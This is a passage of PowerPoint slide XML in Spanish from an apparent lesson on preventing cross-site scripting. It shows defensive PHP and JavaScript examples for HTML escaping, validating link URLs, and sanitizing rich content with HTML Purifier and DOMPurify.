          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="424543" y="2409696"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="CuadroTexto 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{184CCAC7-A98C-C2D3-5B84-4C7275A3F05F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2813957" y="2622514"/>
            <a:ext cx="7500257" cy="3693319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>escapeHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>    '&amp;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>amp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>    '&lt;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>    '&gt;': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>    '"': '&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>quot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>    "'": '&amp;#039;'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  };</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>text.replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(/[&amp;&lt;&gt;"']/g, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(m) { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>[m]; });</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('contenido').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>escapeHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21225552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235631" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Codificar datos de salida</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F556A794-9D08-F8A1-F3BC-89B3037BFBF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="326570" y="980728"/>
            <a:ext cx="11342915" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Validación de salida</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: Asegúrese de que los datos que se muestran en su sitio web sean seguros y estén en el formato esperado. Por ejemplo, si está mostrando un enlace, puede verificar que el enlace comience con http:// o https:// para evitar que se muestren enlaces maliciosos</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="CuadroTexto 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07985441-29B5-7DB0-F292-5A23EE9DF2B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="326570" y="2040364"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en PHP:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="CuadroTexto 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D08C4D9-150C-D0CA-A6D3-272861BB4CCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3374570" y="2060880"/>
            <a:ext cx="6096000" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = $_GET['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>strpos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, 'http://') === 0 || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>strpos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, 'https://') === 0) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  echo '&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>="' . </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>) . '"&gt;Enlace&lt;/a&gt;';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> 'URL no válida';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="CuadroTexto 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C491E87-3065-2A70-3D09-1525693A1877}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="424543" y="4125139"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="CuadroTexto 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26D91C0D-D845-6793-099E-15B73E1D1E8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3374570" y="4309805"/>
            <a:ext cx="6096000" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>window.location.search.substring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(1).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>split</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('=')[1];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('http://') === 0 || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('https://') === 0) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('enlace').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('enlace').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = 'URL no válida';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38673511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235631" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Codificar datos de salida</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A8F3B53-2916-E7CF-E9B7-951FFAF3653D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348343" y="980728"/>
            <a:ext cx="11288486" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Sanitización de salida</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: Si está mostrando datos enriquecidos, como HTML o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BBCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, es importante limpiar y validar estos datos antes de mostrarlos en su sitio web. Puede hacer esto utilizando una biblioteca como HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> en PHP o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> en JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C146F5D8-8BB5-80D1-CC7E-AF6794EE12E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348343" y="2101334"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en PHP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC192C4A-9956-908C-E382-DC248F380FD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2178708"/>
            <a:ext cx="6096000" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>require_once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> '/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>HTMLPurifier.auto.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>HTMLPurifier_Config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>createDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>HTMLPurifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>echo $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>purify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="CuadroTexto 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{09D6808A-A9F5-90B0-9221-1410A674D81C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348343" y="3930686"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="CuadroTexto 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BA6F2D1-F066-7368-A662-C3C3A4957BC3}"/>
              </a:ext>
            </a:extLst>
